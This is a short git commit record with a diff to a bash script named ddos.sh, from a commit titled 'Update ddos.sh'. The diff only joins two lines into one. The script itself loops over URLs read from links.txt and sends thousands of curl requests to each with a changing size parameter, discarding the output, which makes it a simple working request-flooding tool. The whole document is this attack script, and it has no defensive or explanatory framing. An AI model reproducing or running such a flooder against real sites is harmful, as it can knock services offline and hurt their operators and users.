7a62a51db7ace82f53904607726e6a2e301920f6
Henrique Bissoli <emp_shad@hotmail.com>
2015-10-29 12:17:27 -0200

    Update ddos.sh

--- ddos.sh
+++ ddos.sh
@@ -1,7 +1,6 @@
 #!/bin/bash
 cat links.txt | while read line; do
         for ((i=1000; i<=7700; i++)); do
-                curl -sS "$line?sz=$i" > /dev/null;
-                echo "size: $i"
+                curl -sS "$line?sz=$i" > /dev/null; echo "size: $i"
         done
 done
